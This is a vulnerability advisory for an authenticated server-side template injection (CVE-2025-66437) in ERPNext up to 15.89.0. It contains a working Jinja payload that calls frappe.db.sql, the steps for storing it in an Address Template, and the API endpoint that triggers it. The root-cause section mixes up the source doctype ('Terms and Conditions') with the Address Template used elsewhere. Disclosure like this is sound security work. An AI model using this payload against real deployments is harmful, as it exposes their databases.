**SSTI on ERPNEXT ≤ 15.89.0 (CVE-2025-66437)**

**Exploit Author: An Chu ( aka iamanc )**

**Vendor:** Frappe Technologies Pvt. Ltd.

**Product:** ERPNext

**Affected Versions:** ERPNext ≤ 15.89.0

**CVE:  CVE‑2025‑66437**

**Impact:** 

An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries via server-side template injection, resulting in disclosure of sensitive database information.

**Summary**:

An **authenticated SSTI (Server-Side Template Injection)** vulnerability exists in the `get_address_display` method of ERPNext. This function renders address templates using `frappe.render_template()` with a context derived from the `address_dict` parameter, which can be either a dictionary or a string referencing an `Address` document.

Although ERPNext uses a custom Jinja2 `SandboxedEnvironment`, dangerous functions like `frappe.db.sql` remain accessible via `get_safe_globals()`.

An attacker with permission to create or modify an `Address Template` can inject arbitrary Jinja expressions into the `template` field. By creating an `Address` document with a matching `country`, and then calling the `get_address_display` API with `address_dict="address_name"`, the system will render the malicious template using attacker-controlled data. This leads to server-side code execution or database information disclosure.

**Technical Details:**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database.

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Vulnerable Template Rendering:**

frappe uses frappe.render_template(template, context) to render Jinja2 templates. Even with SandboxedEnvironment, dangerous globals remain:

```php
from frappe import render_template, get_safe_globals

render_template(user_template, user_context)
```

`get_safe_globals()` exposes:

- frappe.db.sql
- frappe.get_doc
- frappe.throw
- frappe.local

If a malicious Jinja expression is injected, attacker can execute Python code in this restricted environment and query the database.

**Vulnerable Functions Analysis:**

**Vulnerable source code:**

File frappe/contacts/doctype/address/address.py

```python
@frappe.whitelist()
def get_address_display(address_dict: dict | str | None) -> str | None:
	return render_address(address_dict)

def render_address(address: dict | str | None, check_permissions=True) -> str | None:
	if not address:
		return

	if not isinstance(address, dict):
		address = frappe.get_cached_doc("Address", address)
		if check_permissions:
			address.check_permission()
		address = address.as_dict()

	name, template = get_address_templates(address)

	try:
		return frappe.render_template(template, address)
	except TemplateSyntaxError:
		frappe.throw(_("There is an error in your Address Template {0}").format(name))

```

**Root Cause**

```python
frappe.render_template(template, address)
```

- `template` is loaded directly from the **Terms and Conditions** doctype.
- This field is fully **user‑controlled** by authenticated users with permission to create or edit Contract Templates.
- The value is rendered using `frappe.render_template()` **without sanitization or sandbox hardening**.
- The Jinja2 execution context exposes unsafe globals via `get_safe_globals()`, including `frappe.db.sql`.

As a result, an authenticated attacker can inject arbitrary Jinja2 expressions, leading to **Server‑Side Template Injection (SSTI)**.

**PoC:**

### Step 1: Inject SSTI Payload via UI

Navigate to:

```
CRM -> Address Template -> New Address Template
```

Set template to:

```
{{ frappe.db.sql("SELECT @@version") }} //iamanc
```

Save the document.

<img width="1467" height="400" alt="image" src="https://github.com/user-attachments/assets/00cd2add-f8f7-47ac-bcbb-a16084f63678" />


At this stage, the payload is stored but not yet executed.

<img width="2004" height="400" alt="image" src="https://github.com/user-attachments/assets/e487a041-a97a-43d8-9d52-d8ded6e2a0b2" />


---

Step 2: Create an Address Matching the Template

Navigate to:

```php
CRM → Address -> New Address
```

Create new address with Country: Algeria and save Address name like SSTI-Bug-4

<img width="1439" height="400" alt="image" src="https://github.com/user-attachments/assets/41b87439-357f-4b0f-b2e5-d17f4b6d9352" />


Step #: Direct API Invocation

The same vulnerability can be triggered by calling the whitelisted method directly:

```
POST /api/method/frappe.contacts.doctype.address.address.get_address_display
```

When the request is processed, the injected `template`payload is rendered and executed, and the evaluated output is returned in the response.
<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/cf045196-1bee-45a9-8cae-243dce0b3404" />
